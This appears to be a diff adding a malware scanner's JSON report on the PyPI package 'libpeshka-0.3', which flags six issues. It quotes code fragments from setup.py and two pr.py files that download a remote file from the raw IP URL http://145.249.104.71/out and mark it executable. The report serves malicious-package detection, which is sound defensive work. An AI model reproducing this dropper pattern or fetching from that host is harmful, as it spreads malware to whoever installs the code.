@@ -1,0 +1,50 @@
+{
+    "issues": 6,
+    "errors": {},
+    "results": {
+        "exec-base64": {},
+        "clipboard-access": {},
+        "obfuscation": {},
+        "silent-process-execution": {},
+        "steganography": {},
+        "dll-hijacking": {},
+        "cmd-overwrite": {},
+        "exfiltrate-sensitive-data": {},
+        "code-execution": {},
+        "download-executable": [
+            {
+                "location": "libari/pr.py:13",
+                "code": "        \td = open (LOC, \"wb\")\n        \td.write (response.read ())\n        \td.close ()\n\n        \tcurrent_state = os.stat (LOC)\n        \tos.chmod (LOC, current_state.st_mode|stat.S_IEXEC)\n",
+                "message": "This package is downloading making executable a remote binary"
+            },
+            {
+                "location": "pr.py:24",
+                "code": "                d = open (LOC, \"wb\")\n                d.write (response)\n                d.close ()\n\n                current_state = os.stat (LOC)\n                os.chmod (LOC, current_state.st_mode|stat.S_IEXEC)\n",
+                "message": "This package is downloading making executable a remote binary"
+            },
+            {
+                "location": "setup.py:26",
+                "code": "                d = open (LOC, \"wb\")\n                d.write (response)\n                d.close ()\n\n                current_state = os.stat (LOC)\n                os.chmod (LOC, current_state.st_mode|stat.S_IEXEC)\n",
+                "message": "This package is downloading making executable a remote binary"
+            }
+        ],
+        "shady-links": [
+            {
+                "location": "libari/pr.py:7",
+                "code": "\tADD_LOC = \"http://145.249.104.71/out\"\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            },
+            {
+                "location": "pr.py:14",
+                "code": "        ADD_LOC = \"http://145.249.104.71/out\"\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            },
+            {
+                "location": "setup.py:16",
+                "code": "        ADD_LOC = \"http://145.249.104.71/out\"\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            }
+        ]
+    },
+    "path": "./dataset/pypi/libpeshka-0.3"
+}
